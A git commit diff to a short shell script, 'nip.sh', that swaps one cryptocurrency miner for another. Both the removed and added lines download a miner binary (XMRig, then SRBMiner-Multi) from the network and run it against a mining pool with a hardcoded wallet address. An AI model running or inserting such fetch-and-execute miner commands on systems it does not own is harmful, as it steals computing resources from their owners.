42d863465200253eab3e5c96bb8b740867d1e06a
barburonjilo <barburonjilo@outlook.co.id>
2025-01-30 06:35:02 +0700

    Update nip.sh

--- nip.sh
+++ nip.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz && rm xmrig-6.22.2-linux-static-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --url pool.hashvault.pro:443 --user NaWe5B5NqvZ3TV2Mj1pxYtTgrnTBwQDMDNtqVzMR6Xa5ejxu6hbi6KULHTqd732ebc5qTHvKXonokghUBd3pjLa8cznQZAsPivi2FKbV8qZk.22541fe3529f913b --pass x --donate-level 0 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.5/SRBMiner-Multi-2-7-5-Linux.tar.gz && tar -xvf SRBMiner-Multi-2-7-5-Linux.tar.gz && rm SRBMiner-Multi-2-7-5-Linux.tar.gz && cd SRBMiner-Multi-2-7-5 && ./SRBMiner-MULTI -a yescryptR8 -o stratum+tcp://yescryptR8.asia.mine.zergpool.com:6323 -u MewnX5zciYoGSdXYj3SeoyqFjKPy9BCNYv -p c=MTBC,mc=MTBC,ID=1
